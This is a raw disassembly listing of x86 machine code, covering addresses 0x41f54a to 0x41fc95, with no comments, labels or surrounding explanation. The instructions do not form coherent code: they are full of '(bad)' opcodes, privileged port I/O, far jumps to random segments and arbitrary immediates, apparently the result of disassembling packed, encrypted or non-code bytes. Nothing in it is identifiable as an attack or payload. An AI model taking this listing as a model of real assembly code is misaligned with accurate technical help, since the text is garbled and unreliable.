  41f54a:	ja     0x41f501
  41f54c:	dec    edi
  41f54d:	xor    cl,BYTE PTR [edi]
  41f54f:	retf   
  41f550:	loop   0x41f599
  41f552:	ret    0xa41a
  41f555:	xchg   ebx,eax
  41f556:	ret    
  41f557:	gs mov dh,ch
  41f55a:	pop    edi
  41f55b:	stc    
  41f55c:	inc    edi
  41f55d:	not    DWORD PTR [edi]
  41f55f:	add    ebx,eax
  41f561:	mov    fs,esp
  41f563:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f564:	pushf  
  41f565:	cwde   
  41f566:	or     edi,DWORD PTR [esi+0xd]
  41f569:	(bad)  
  41f56a:	arpl   WORD PTR [edx-0x55e6a92b],si
  41f570:	idiv   BYTE PTR [edi+edi*1-0x1d67fcf9]
  41f577:	sub    ecx,esp
  41f579:	in     al,dx
  41f57a:	fucom  st(6)
  41f57c:	pop    esi
  41f57d:	push   edx
  41f57e:	fldlg2 
  41f580:	in     eax,dx
  41f581:	sbb    BYTE PTR [eax+0x6e952b4],ah
  41f587:	test   eax,0x967eb57
  41f58c:	jmp    0xd50e118f
  41f591:	cmp    al,0xe8
  41f593:	jmp    0xf8e7:0x9c4ce858
  41f59a:	in     eax,dx
  41f59b:	inc    ecx
  41f59c:	xor    dh,BYTE PTR [eax+0xd]
  41f59f:	jmp    0x41f5a6
  41f5a1:	and    al,0xd
  41f5a3:	ror    BYTE PTR [eax-0x3b4d4ffe],0x11
  41f5aa:	jle    0x41f57c
  41f5ac:	and    DWORD PTR [edx],ebx
  41f5ae:	shl    DWORD PTR [edx+0x6f1e2560],1
  41f5b4:	test   edx,edx
  41f5b6:	cmp    al,dh
  41f5b8:	mul    DWORD PTR [edx+0x59]
  41f5bb:	push   ebp
  41f5bc:	sbb    DWORD PTR [esi+eiz*4-0x50265654],ebx
  41f5c3:	into   
  41f5c4:	push   eax
  41f5c5:	dec    ebx
  41f5c6:	add    ebp,DWORD PTR ds:[ebx+0x24555f4]
  41f5cd:	aad    0x6
  41f5cf:	sub    bl,BYTE PTR [edx]
  41f5d1:	(bad)  
  41f5d2:	xor    esi,DWORD PTR [eax]
  41f5d4:	and    al,0x30
  41f5d6:	pop    esp
  41f5d7:	mov    es,WORD PTR [edx-0x7a3ddb4c]
  41f5dd:	test   al,0x6f
  41f5df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f5e0:	inc    edi
  41f5e1:	pop    eax
  41f5e2:	mov    ah,0x79
  41f5e4:	leave  
  41f5e5:	aad    0x39
  41f5e7:	dec    edi
  41f5e8:	pushf  
  41f5e9:	lock repnz pop ecx
  41f5ec:	lock out 0xc5,eax
  41f5ef:	mov    WORD PTR [eax+0x65],ss
  41f5f2:	adc    edx,DWORD PTR [edx]
  41f5f4:	adc    BYTE PTR [ebp-0x10],0x35
  41f5f8:	lea    edx,[eax-0x6c]
  41f5fb:	sub    eax,0x4c6ad68a
  41f600:	dec    esp
  41f601:	sbb    eax,0x339d5c62
  41f606:	fwait
  41f607:	pop    ebx
  41f608:	adc    al,0x58
  41f60a:	jp     0x41f63b
  41f60c:	hlt    
  41f60d:	xchg   ebx,eax
  41f60e:	dec    ebp
  41f60f:	aaa    
  41f610:	push   ss
  41f611:	or     al,0xe3
  41f613:	loope  0x41f67c
  41f615:	dec    edi
  41f616:	enter  0xee63,0x64
  41f61a:	(bad)  
  41f61b:	push   edx
  41f61c:	xor    edx,DWORD PTR [eax-0x2e]
  41f61f:	dec    ecx
  41f620:	js     0x41f623
  41f622:	stc    
  41f623:	in     eax,0x33
  41f625:	push   ss
  41f626:	push   edx
  41f627:	mov    bl,0x46
  41f629:	sbb    al,0xa2
  41f62b:	hlt    
  41f62c:	mov    dh,0xa1
  41f62e:	call   0x3285:0xc90cc99
  41f635:	cld    
  41f636:	jae    0x41f66b
  41f638:	jne    0x41f649
  41f63a:	dec    esi
  41f63b:	xor    BYTE PTR [edi*4+0x303d5b88],0x16
  41f643:	cmp    DWORD PTR [ebx+0xb],ebp
  41f646:	sub    eax,0x916917c
  41f64b:	stos   BYTE PTR es:[edi],al
  41f64c:	and    BYTE PTR [edx-0x76],dl
  41f64f:	scas   eax,DWORD PTR es:[edi]
  41f650:	mov    al,ds:0xf145b3f8
  41f655:	lahf   
  41f656:	inc    edi
  41f657:	loop   0x41f607
  41f659:	rol    DWORD PTR [esi],1
  41f65b:	fcomp  DWORD PTR [edi+0x31075fa0]
  41f661:	pop    esi
  41f662:	shl    esp,cl
  41f664:	lahf   
  41f665:	(bad)  
  41f666:	and    BYTE PTR [ecx],ch
  41f668:	mov    al,0x43
  41f66a:	sbb    DWORD PTR [ebx],eax
  41f66c:	push   ds
  41f66d:	xchg   bl,al
  41f66f:	cmp    al,0x5f
  41f671:	and    al,0xce
  41f673:	xor    ah,bh
  41f675:	and    al,0xb6
  41f677:	mov    BYTE PTR [edx],cl
  41f679:	push   0xede92f9b
  41f67e:	xor    al,0x9f
  41f680:	retf   0x7db2
  41f683:	push   esi
  41f684:	mov    WORD PTR [eax-0x25],?
  41f687:	sbb    BYTE PTR [edx+0x5a],bl
  41f68a:	mov    ds:0x15104e9,al
  41f68f:	int3   
  41f690:	dec    ebp
  41f691:	cmp    al,0x54
  41f693:	pusha  
  41f694:	and    al,0x8c
  41f696:	mov    ds:0xf3827f13,al
  41f69b:	pop    ecx
  41f69c:	retf   0x7dad
  41f69f:	push   ds
  41f6a0:	adc    al,0xcc
  41f6a2:	pop    ds
  41f6a3:	ss shl ecx,0xfe
  41f6a7:	cmc    
  41f6a8:	popf   
  41f6a9:	add    edi,DWORD PTR [esi]
  41f6ab:	fwait
  41f6ac:	rcr    bl,0x6c
  41f6af:	mov    bh,0x31
  41f6b1:	ja     0x41f64b
  41f6b3:	and    al,0xdf
  41f6b5:	lods   al,BYTE PTR ds:[esi]
  41f6b6:	add    DWORD PTR cs:[eax],0x471732e
  41f6bd:	imul   esp,DWORD PTR [eax],0xc62a823
  41f6c3:	scas   al,BYTE PTR es:[edi]
  41f6c4:	cmp    cl,dl
  41f6c6:	xor    BYTE PTR [ebx],ch
  41f6c8:	fdivrp st(5),st
  41f6ca:	and    BYTE PTR [ecx+0x3996a3d],al
  41f6d0:	push   ebx
  41f6d1:	adc    ah,BYTE PTR [eax+0x5f]
  41f6d4:	aam    0x76
  41f6d6:	ret    0x82b4
  41f6d9:	jo     0x41f6df
  41f6db:	out    0xa5,al
  41f6dd:	ss sahf 
  41f6df:	xchg   ebp,eax
  41f6e0:	out    dx,eax
  41f6e1:	nop    DWORD PTR [ebx+0x5f47d08c]
  41f6e8:	out    dx,al
  41f6e9:	bound  esp,QWORD PTR [esi+eiz*4]
  41f6ec:	test   al,0x11
  41f6ee:	and    esi,DWORD PTR [edx+eiz*1]
  41f6f1:	fisttp WORD PTR [ebx]
  41f6f3:	lahf   
  41f6f4:	xor    BYTE PTR [ebp+0x3f],ah
  41f6f7:	mov    ds:0xa65fdc0e,al
  41f6fc:	sub    dl,bh
  41f6fe:	xchg   ecx,eax
  41f6ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f700:	inc    edi
  41f701:	mov    ch,0xea
  41f703:	jl     0x41f6f0
  41f705:	icebp  
  41f706:	jle    0x41f751
  41f708:	popa   
  41f709:	push   ebp
  41f70a:	mov    ss,WORD PTR [ecx]
  41f70c:	add    edi,DWORD PTR [edx-0x5cac41b9]
  41f712:	inc    DWORD PTR [esi+0x14a11d99]
  41f718:	push   cs
  41f719:	pop    es
  41f71a:	outs   dx,BYTE PTR ds:[esi]
  41f71b:	jg     0x41f799
  41f71d:	dec    esp
  41f71e:	shl    DWORD PTR [ecx],1
  41f720:	and    al,ah
  41f722:	sub    al,0x27
  41f724:	bound  eax,QWORD PTR [ecx-0xd]
  41f727:	push   0x73
  41f729:	sahf   
  41f72a:	lods   al,BYTE PTR ds:[esi]
  41f72b:	into   
  41f72c:	dec    ebp
  41f72d:	mov    ebp,0xa7739100
  41f732:	mov    ebp,ebp
  41f734:	in     eax,dx
  41f735:	inc    ecx
  41f736:	popa   
  41f737:	pop    es
  41f738:	jbe    0x41f6da
  41f73a:	mov    al,ds:0x28dbac4d
  41f73f:	je     0x41f78e
  41f741:	push   esi
  41f742:	in     eax,0x3b
  41f744:	mov    esp,0x72bb05c8
  41f749:	jg     0x41f74f
  41f74b:	pop    esp
  41f74c:	test   DWORD PTR [esi-0x29],esp
  41f74f:	clc    
  41f750:	cmp    DWORD PTR [edx+0x3ca77f9],0x57
  41f757:	sti    
  41f758:	popf   
  41f759:	out    0xd0,al
  41f75b:	mov    ch,0x4f
  41f75d:	imul   ecx,DWORD PTR [ecx+0x6a153274],0x5b
  41f764:	std    
  41f765:	jbe    0x41f760
  41f767:	mov    ds:0x62e4f6ec,eax
  41f76c:	or     dl,al
  41f76e:	mov    dh,0x8b
  41f770:	test   eax,0x89070934
  41f775:	nop
  41f776:	test   eax,0xb9678b03
  41f77b:	inc    ebp
  41f77c:	les    edi,FWORD PTR [edi+0xd84aff1]
  41f782:	pop    es
  41f783:	fisub  WORD PTR [eax]
  41f785:	es pop eax
  41f787:	inc    eax
  41f788:	and    DWORD PTR [edi+edi*4+0x24298b43],ebp
  41f78f:	shl    BYTE PTR ds:0x73f85d09,0x3
  41f796:	cwde   
  41f797:	adc    ecx,ebx
  41f799:	mov    DWORD PTR [edx+0x517fd692],0x9228206f
  41f7a3:	push   0xa7470cbd
  41f7a8:	fadd   DWORD PTR [esi]
  41f7aa:	mov    eax,ds:0xb55a7461
  41f7af:	pusha  
  41f7b0:	xchg   ebp,eax
  41f7b1:	dec    ebx
  41f7b2:	jnp    0x41f76b
  41f7b4:	aam    0x28
  41f7b6:	punpcklbw mm1,DWORD PTR [edi+0xe]
  41f7ba:	das    
  41f7bb:	dec    ecx
  41f7bc:	add    DWORD PTR [edi],ebp
  41f7be:	pop    ds
  41f7bf:	(bad)  
  41f7c0:	cld    
  41f7c1:	mov    ds:0x5e605ec6,al
  41f7c6:	test   eax,0x2b1945f5
  41f7cb:	int    0x6a
  41f7cd:	sbb    dh,0xce
  41f7d0:	out    dx,al
  41f7d1:	sub    eax,0xc5493849
  41f7d6:	test   al,0x7d
  41f7d8:	outs   dx,BYTE PTR ds:[esi]
  41f7d9:	leave  
  41f7da:	push   esp
  41f7db:	icebp  
  41f7dc:	iret   
  41f7dd:	xor    bh,0xa5
  41f7e0:	addr16 inc edi
  41f7e2:	adc    BYTE PTR [eax],ah
  41f7e4:	es stos DWORD PTR es:[edi],eax
  41f7e6:	mov    BYTE PTR [esi-0x2418989f],ah
  41f7ec:	pop    ds
  41f7ed:	inc    esp
  41f7ee:	bound  esi,QWORD PTR [edx+0x3f66f814]
  41f7f4:	ror    BYTE PTR [eax-0x64],cl
  41f7f7:	sbb    bh,BYTE PTR [ecx]
  41f7f9:	rol    bl,cl
  41f7fb:	inc    ebx
  41f7fc:	xlat   BYTE PTR ds:[ebx]
  41f7fd:	ja     0x41f7e8
  41f7ff:	fwait
  41f800:	jg     0x41f795
  41f802:	cmp    BYTE PTR [edi-0x65],bl
  41f805:	mov    dh,ch
  41f807:	rcl    DWORD PTR [ecx],0xc1
  41f80a:	test   eax,0xe1239bd0
  41f80f:	sub    eax,ecx
  41f811:	inc    ebp
  41f812:	inc    ecx
  41f813:	xor    al,0x27
  41f815:	inc    eax
  41f816:	or     ecx,esp
  41f818:	(bad)  
  41f819:	es das 
  41f81b:	dec    ebx
  41f81c:	in     eax,dx
  41f81d:	xlat   BYTE PTR ds:[ebx]
  41f81e:	das    
  41f81f:	push   eax
  41f820:	xchg   ebx,eax
  41f821:	lods   al,BYTE PTR ds:[esi]
  41f822:	inc    edi
  41f823:	ret    0x46c8
  41f826:	test   eax,0x9bc57fb
  41f82b:	mov    edx,0xec4d0fd3
  41f830:	mov    WORD PTR [edi+0x6c75ebd8],cs
  41f836:	aas    
  41f837:	arpl   dx,si
  41f839:	pop    esi
  41f83a:	pop    edi
  41f83b:	in     al,0x86
  41f83d:	aas    
  41f83e:	jnp    0x41f821
  41f840:	and    al,0x70
  41f842:	mov    eax,0x8dba422d
  41f847:	inc    esi
  41f848:	clc    
  41f849:	mov    esi,0xad518b8c
  41f84e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f84f:	adc    eax,0x8c46bd46
  41f854:	(bad)  
  41f855:	cmp    ch,BYTE PTR [ebx]
  41f857:	mov    eax,ds:0x62556d5b
  41f85c:	popf   
  41f85d:	popf   
  41f85e:	mov    eax,ds:0xbc73ae57
  41f863:	test   edx,ecx
  41f865:	xor    BYTE PTR [eax+0x690dcb65],dl
  41f86b:	lods   al,BYTE PTR ds:[esi]
  41f86c:	sbb    al,0x19
  41f86e:	popf   
  41f86f:	push   ebp
  41f870:	mov    edx,0x4995414a
  41f875:	push   ds
  41f876:	loop   0x41f8e1
  41f878:	ret    0x60f
  41f87b:	xchg   edx,eax
  41f87c:	out    dx,al
  41f87d:	mov    ds:0xa11be691,eax
  41f882:	jne    0x41f8d4
  41f884:	scas   al,BYTE PTR es:[edi]
  41f885:	cwde   
  41f886:	popf   
  41f887:	mov    ch,0xf9
  41f889:	jl     0x41f83c
  41f88b:	xchg   DWORD PTR [esi+edi*2-0x6ca226ec],esi
  41f892:	mov    al,0x9d
  41f894:	dec    ebp
  41f895:	xchg   DWORD PTR [ebp+0x50],ebp
  41f898:	aaa    
  41f899:	in     eax,dx
  41f89a:	pop    ebx
  41f89b:	pop    ebx
  41f89c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f89d:	mov    ecx,0x4821b6de
  41f8a2:	lock add DWORD PTR [edi],esi
  41f8a5:	(bad)  
  41f8a6:	push   ds
  41f8a7:	lea    ebp,ds:[edx-0x1f]
  41f8ab:	ja     0x41f927
  41f8ad:	inc    esi
  41f8ae:	jne    0x41f894
  41f8b0:	mov    ds:0xc3c0cc2e,al
  41f8b5:	dec    eax
  41f8b6:	push   ds
  41f8b7:	pop    edi
  41f8b8:	sbb    edi,eax
  41f8ba:	or     bl,BYTE PTR ds:0x8b0da308
  41f8c0:	(bad)  
  41f8c2:	push   0x6e987080
  41f8c7:	mul    esp
  41f8c9:	adc    al,ah
  41f8cb:	aam    0xf1
  41f8cd:	or     DWORD PTR [esp+esi*8+0x7d7478a],edi
  41f8d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f8d5:	ss pop ds
  41f8d7:	into   
  41f8d8:	pop    es
  41f8d9:	sar    esi,cl
  41f8db:	mov    eax,eax
  41f8dd:	popa   
  41f8de:	fwait
  41f8df:	xor    al,0x46
  41f8e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f8e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f8e3:	mov    esp,0x3ffc1784
  41f8e8:	loopne 0x41f8f3
  41f8ea:	xlat   BYTE PTR ds:[ebx]
  41f8eb:	adc    al,0x6
  41f8ed:	push   es
  41f8ee:	mov    edx,0x3fb222f
  41f8f3:	add    al,0xa3
  41f8f5:	scas   eax,DWORD PTR es:[edi]
  41f8f6:	rcr    BYTE PTR [eax-0x48f0fe64],0x7e
  41f8fd:	or     eax,0xe879ea9a
  41f902:	repnz pushf 
  41f904:	xchg   DWORD PTR [eax-0x63a0bed4],ebp
  41f90a:	sub    al,0xd5
  41f90c:	jmp    0x41f94c
  41f90e:	(bad)  
  41f90f:	out    dx,eax
  41f910:	out    dx,eax
  41f911:	stos   DWORD PTR es:[edi],eax
  41f912:	cmp    BYTE PTR [ecx-0x6682619b],bh
  41f918:	dec    edi
  41f919:	xor    DWORD PTR [eax-0x6],eax
  41f91c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f91d:	int3   
  41f91e:	add    BYTE PTR [esp+eiz*4+0x72],bh
  41f922:	es mov eax,0x54dd0432
  41f928:	mov    ds:0xb5f87b31,eax
  41f92d:	jle    0x41f980
  41f92f:	sub    eax,0xc3f3543c
  41f934:	xchg   edi,eax
  41f935:	mov    ecx,0x2f6c0748
  41f93a:	(bad)  [ecx+0x3fc5c13b]
  41f940:	xor    dh,al
  41f942:	pop    ebp
  41f943:	push   edi
  41f944:	pushf  
  41f945:	(bad)
  41f948:	(bad)  
  41f949:	or     esp,DWORD PTR [esi+0x7e93fb1b]
  41f94f:	(bad)  
  41f950:	pop    ss
  41f951:	pop    eax
  41f952:	push   edi
  41f953:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f954:	mov    DWORD PTR [edi],esi
  41f956:	stos   BYTE PTR es:[edi],al
  41f957:	pop    esp
  41f958:	cmp    dh,BYTE PTR [ebx+0x17]
  41f95b:	lock repz shl BYTE PTR ds:0x2d5d0297,0xb1
  41f964:	jle    0x41f928
  41f966:	pop    es
  41f967:	int3   
  41f968:	rol    edx,1
  41f96a:	in     eax,0xad
  41f96c:	jle    0x41f9ad
  41f96e:	inc    ecx
  41f96f:	pop    esp
  41f970:	inc    ecx
  41f971:	sbb    eax,0xb3279a63
  41f976:	pop    ecx
  41f977:	push   es
  41f978:	dec    ecx
  41f979:	mov    al,ds:0xa87d00d0
  41f97e:	aaa    
  41f97f:	rcl    DWORD PTR [edi-0x5d],1
  41f982:	mov    ebx,0xb1cddbfc
  41f987:	mov    dl,0xd2
  41f989:	jns    0x41f9d8
  41f98b:	hlt    
  41f98c:	jns    0x41fa0b
  41f98e:	jb     0x41f9db
  41f990:	dec    ecx
  41f991:	pop    ebx
  41f992:	push   0x40
  41f994:	jbe    0x41f99c
  41f996:	nop
  41f997:	push   cs
  41f998:	mov    eax,ds:0x60784421
  41f99d:	imul   ecx,esp,0x7905280a
  41f9a3:	jno    0x41f9cb
  41f9a5:	out    dx,al
  41f9a6:	mov    ch,0x63
  41f9a8:	mov    ds:0xbabd23dc,eax
  41f9ad:	sbb    BYTE PTR [esi],ch
  41f9af:	cmp    eax,0x3a7ff3c1
  41f9b4:	push   esi
  41f9b5:	retf   
  41f9b6:	inc    eax
  41f9b7:	inc    edi
  41f9b8:	fld    TBYTE PTR [edx-0x31]
  41f9bb:	jle    0x41fa2a
  41f9bd:	mov    DWORD PTR [ecx+ebp*1],ecx
  41f9c0:	push   esi
  41f9c1:	fwait
  41f9c2:	jmp    0x41f9aa
  41f9c4:	repz jns 0x41f9dd
  41f9c7:	mov    edx,DWORD PTR [edi+0x7f]
  41f9ca:	(bad)  
  41f9cb:	int    0xd1
  41f9cd:	inc    esi
  41f9ce:	add    ebx,DWORD PTR [eax+0x56]
  41f9d1:	dec    ebx
  41f9d2:	arpl   WORD PTR ds:0x12b07217,bx
  41f9d8:	arpl   WORD PTR [edx-0x6ad11cac],ax
  41f9de:	dec    edi
  41f9df:	and    BYTE PTR [ebx-0x4a],bl
  41f9e2:	or     BYTE PTR [ecx+esi*4+0x5],bl
  41f9e6:	adc    esp,DWORD PTR [ecx+ecx*4+0x32]
  41f9ea:	(bad)  
  41f9eb:	sbb    eax,0x616ba69a
  41f9f0:	pop    es
  41f9f1:	(bad)  
  41f9f3:	jmp    0x555e:0x1cac99fd
  41f9fa:	and    DWORD PTR [ebx-0x39b6375c],edx
  41fa00:	std    
  41fa01:	mov    eax,0x8a027341
  41fa06:	in     eax,0x17
  41fa08:	jae    0x41f9c8
  41fa0a:	(bad)  [ebp-0x6cb230d2]
  41fa10:	or     BYTE PTR fs:[edx],dl
  41fa13:	mov    edx,0x3d0ba457
  41fa18:	inc    ebp
  41fa19:	xchg   esp,eax
  41fa1a:	push   edx
  41fa1b:	fild   DWORD PTR [ebp-0x29df056d]
  41fa21:	xchg   esi,eax
  41fa22:	mov    bh,0xec
  41fa24:	sub    eax,esp
  41fa26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa27:	push   ss
  41fa28:	push   esi
  41fa29:	sub    DWORD PTR [ebx-0x4b6207ee],ebp
  41fa2f:	dec    esi
  41fa30:	bound  ax,DWORD PTR [ecx+0x5862f4e6]
  41fa37:	aam    0xb4
  41fa39:	pop    ebp
  41fa3a:	adc    dl,bl
  41fa3c:	sub    al,0x77
  41fa3e:	sbb    ah,BYTE PTR [esi-0xbe07791]
  41fa44:	int    0x81
  41fa46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa47:	mov    eax,ds:0x6e559f91
  41fa4c:	and    al,0xea
  41fa4e:	inc    esi
  41fa4f:	adc    al,0x87
  41fa51:	ss jg  0x41fa90
  41fa54:	ficomp DWORD PTR [eax+eiz*2-0x6b2da958]
  41fa5b:	pop    ebx
  41fa5c:	clc    
  41fa5d:	cld    
  41fa5e:	pop    es
  41fa5f:	loop   0x41fa35
  41fa61:	scas   eax,DWORD PTR es:[edi]
  41fa62:	clc    
  41fa63:	iret   
  41fa64:	stc    
  41fa65:	out    0x20,al
  41fa67:	adc    ebp,DWORD PTR [ecx+ebx*2+0x60372274]
  41fa6e:	dec    ebp
  41fa6f:	(bad)  
  41fa70:	push   cs
  41fa71:	adc    DWORD PTR [edi+0x61],ebx
  41fa74:	mov    bl,0x8f
  41fa76:	bound  ecx,QWORD PTR [ebx-0x2]
  41fa79:	cwde   
  41fa7a:	aas    
  41fa7b:	shl    BYTE PTR [ebp+0x1234cd92],0xd6
  41fa82:	inc    ecx
  41fa83:	mov    cl,0x75
  41fa85:	adc    DWORD PTR [esi+0x6edea90e],edi
  41fa8b:	stos   DWORD PTR es:[edi],eax
  41fa8c:	ror    BYTE PTR [ebx+0x4b],0x79
  41fa90:	and    al,0x5a
  41fa92:	add    BYTE PTR [eax-0x1b],bh
  41fa95:	ins    BYTE PTR es:[edi],dx
  41fa96:	and    eax,0x305048c6
  41fa9b:	push   ebp
  41fa9c:	rcr    cl,1
  41fa9e:	dec    esp
  41fa9f:	(bad)  
  41faa0:	in     eax,0x59
  41faa2:	or     eax,ebx
  41faa4:	xor    al,0x3f
  41faa6:	add    BYTE PTR [ebx+0x130fc9f4],bh
  41faac:	aaa    
  41faad:	dec    edx
  41faae:	jbe    0x41fb16
  41fab0:	jle    0x41fa64
  41fab2:	scas   al,BYTE PTR es:[edi]
  41fab3:	cmp    eax,0x48e19085
  41fab8:	add    eax,0xf46d2f04
  41fabd:	mov    esp,0x2a85389
  41fac2:	jg     0x41fb3b
  41fac4:	mov    dh,0xbf
  41fac6:	shl    BYTE PTR [ebp-0x70],0x41
  41faca:	in     eax,0xb2
  41facc:	jne    0x41fa55
  41face:	or     eax,0x3ed28e18
  41fad3:	mov    al,0xe9
  41fad5:	jo     0x41fac6
  41fad7:	ins    BYTE PTR es:[edi],dx
  41fad8:	or     DWORD PTR ds:[edi+eax*8-0x40d5ca6c],ebx
  41fae0:	les    eax,FWORD PTR [ecx+0x75debfb9]
  41fae6:	or     dl,BYTE PTR [edi+0x106d1cd5]
  41faec:	jo     0x41fa8d
  41faee:	xor    ebx,0x4a
  41faf1:	adc    bh,dh
  41faf3:	aas    
  41faf4:	test   BYTE PTR ss:[esi-0x55a6f0db],ah
  41fafb:	lock repnz mov ebp,0x2d1284d
  41fb02:	hlt    
  41fb03:	sbb    al,0xec
  41fb05:	loopne 0x41fafe
  41fb07:	xlat   BYTE PTR ds:[ebx]
  41fb08:	arpl   WORD PTR [ebp+0x50],si
  41fb0b:	mov    esi,0xe23cf07f
  41fb10:	xchg   ebp,eax
  41fb11:	mov    ebp,0x4cc13288
  41fb16:	dec    eax
  41fb17:	mov    bh,0xe0
  41fb19:	mov    esp,0xc742995f
  41fb1e:	loop   0x41faf7
  41fb20:	sub    DWORD PTR [ebx],ebx
  41fb22:	cmp    al,0x6f
  41fb24:	xlat   BYTE PTR ds:[ebx]
  41fb25:	sahf   
  41fb26:	rcl    ah,1
  41fb28:	dec    eax
  41fb29:	mov    bl,0x10
  41fb2b:	push   cs
  41fb2c:	imul   edi,DWORD PTR [edx+0x4ffd3cb4],0xffffffec
  41fb33:	add    al,0x37
  41fb35:	out    0x53,al
  41fb37:	mov    esp,DWORD PTR [ebx+0x2a]
  41fb3a:	adc    edi,ecx
  41fb3c:	mov    edx,0xafdbbfee
  41fb41:	sub    al,0x71
  41fb43:	jp     0x41fad8
  41fb45:	leave  
  41fb46:	repnz mov esi,0x72b02b1a
  41fb4c:	inc    ecx
  41fb4d:	mov    es,edx
  41fb4f:	pop    edx
  41fb50:	mov    ebp,gs
  41fb52:	jmp    0x89b34e34
  41fb57:	mov    WORD PTR [eax],?
  41fb59:	jnp    0x41fb1a
  41fb5b:	xor    al,0x27
  41fb5d:	pop    edi
  41fb5e:	(bad)  [ecx+0x23]
  41fb61:	rcr    DWORD PTR [ebx-0x4666bc2b],1
  41fb67:	sub    DWORD PTR [esi+0x20],edi
  41fb6a:	jmp    0x41fb0f
  41fb6c:	push   esi
  41fb6d:	ins    BYTE PTR es:[edi],dx
  41fb6e:	lock and eax,0x5d0c101f
  41fb74:	adc    DWORD PTR [edi+0x2a],eax
  41fb77:	sahf   
  41fb78:	sbb    al,0x5f
  41fb7a:	retf   
  41fb7b:	ja     0x41fb59
  41fb7d:	ins    DWORD PTR es:[edi],dx
  41fb7e:	mov    edx,0xbc4e5d5f
  41fb83:	jmp    FWORD PTR [ebx-0x1c]
  41fb86:	mov    ss,ebx
  41fb88:	sub    dh,dh
  41fb8a:	dec    edi
  41fb8b:	(bad)  
  41fb8c:	push   0xffffff95
  41fb8e:	dec    esp
  41fb8f:	shr    ah,1
  41fb91:	mov    ah,0x65
  41fb93:	mov    ebx,0xa9020382
  41fb98:	jb     0x41fbe7
  41fb9a:	js     0x41fb98
  41fb9c:	mov    ebp,0x8e49c8e8
  41fba1:	mov    ebx,0x86492734
  41fba6:	adc    BYTE PTR [ebp+0x23],bh
  41fba9:	xlat   BYTE PTR ds:[ebx]
  41fbaa:	xchg   esi,eax
  41fbab:	enter  0xd5a3,0x9e
  41fbaf:	jnp    0x41fbc6
  41fbb1:	popf   
  41fbb2:	dec    edx
  41fbb3:	dec    edx
  41fbb4:	jecxz  0x41fbb6
  41fbb6:	leave  
  41fbb7:	push   ebp
  41fbb8:	mul    esp
  41fbba:	dec    eax
  41fbbb:	lods   eax,DWORD PTR ds:[esi]
  41fbbc:	ficomp DWORD PTR [ebx]
  41fbbe:	leave  
  41fbbf:	inc    ecx
  41fbc0:	inc    ebx
  41fbc1:	clc    
  41fbc2:	shl    DWORD PTR [edi+esi*8-0x55178fd5],0xe0
  41fbca:	sbb    cl,BYTE PTR [eax]
  41fbcc:	or     BYTE PTR [ecx-0x1],dl
  41fbcf:	lds    esi,FWORD PTR [edi+ebp*8+0x7657579b]
  41fbd6:	cs mov bh,cl
  41fbd9:	dec    ecx
  41fbda:	out    dx,eax
  41fbdb:	int    0x70
  41fbdd:	ret    0xd2c6
  41fbe0:	or     ebx,edx
  41fbe2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fbe3:	arpl   WORD PTR [ebp+0x17],bp
  41fbe6:	adc    DWORD PTR [eax+0x4b],edx
  41fbe9:	sti    
  41fbea:	div    BYTE PTR [ebx]
  41fbec:	int3   
  41fbed:	in     eax,0xe1
  41fbef:	mov    al,ds:0xccf89a91
  41fbf4:	adc    bl,bh
  41fbf6:	fwait
  41fbf7:	cmp    cl,BYTE PTR [esi]
  41fbf9:	loopne 0x41fbdc
  41fbfb:	ins    DWORD PTR es:[edi],dx
  41fbfc:	adc    dl,0x3a
  41fbff:	int3   
  41fc00:	in     al,dx
  41fc01:	and    eax,0x71e069ce
  41fc06:	mov    al,BYTE PTR [esi-0x6bfb4778]
  41fc0c:	jo     0x41fbac
  41fc0e:	cwde   
  41fc0f:	or     al,dl
  41fc11:	inc    ecx
  41fc12:	adc    BYTE PTR [edi-0x2ee1fd01],cl
  41fc18:	clc    
  41fc19:	mov    DWORD PTR [eax+edi*8],0x2d4da394
  41fc20:	mov    al,ds:0x4f831267
  41fc25:	int3   
  41fc26:	ret    0x7b2a
  41fc29:	xchg   DWORD PTR [edx-0x72],ecx
  41fc2c:	(bad)  
  41fc2d:	lock mov WORD PTR [edx-0x43003e50],?
  41fc34:	std    
  41fc35:	call   0x149eae13
  41fc3a:	push   esi
  41fc3b:	mov    dl,0xc3
  41fc3d:	inc    esi
  41fc3e:	lods   eax,DWORD PTR ds:[esi]
  41fc3f:	pusha  
  41fc40:	mov    ch,0xaa
  41fc42:	sti    
  41fc43:	cmp    eax,DWORD PTR [esi-0x6277649c]
  41fc49:	add    DWORD PTR [eax+0x5a],eax
  41fc4c:	retf   
  41fc4d:	in     eax,dx
  41fc4e:	into   
  41fc4f:	push   eax
  41fc50:	adc    ah,BYTE PTR [edx-0x4e82cc12]
  41fc56:	or     eax,0xc493372a
  41fc5b:	dec    ebp
  41fc5c:	mov    dl,dl
  41fc5e:	rcl    DWORD PTR [eax+edi*8],1
  41fc61:	sbb    ch,dh
  41fc63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fc64:	inc    edx
  41fc65:	xchg   ecx,eax
  41fc66:	js     0x41fccd
  41fc68:	pushf  
  41fc69:	pop    ss
  41fc6a:	stc    
  41fc6b:	aad    0x17
  41fc6d:	and    ecx,0x5fa7c632
  41fc73:	in     eax,dx
  41fc74:	je     0x41fc92
  41fc76:	xor    DWORD PTR [edi+0x2f1cfc07],eax
  41fc7c:	retf   0xefd
  41fc7f:	clc    
  41fc80:	sbb    dh,BYTE PTR [eax+0x11008eed]
  41fc86:	mov    ds:0x2b622fcc,al
  41fc8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fc8c:	test   eax,0xc6a5c5d5
  41fc91:	sub    dh,BYTE PTR [eax-0x2]
  41fc94:	ins    BYTE PTR es:[edi],dx
  41fc95:	xchg   esi,eax
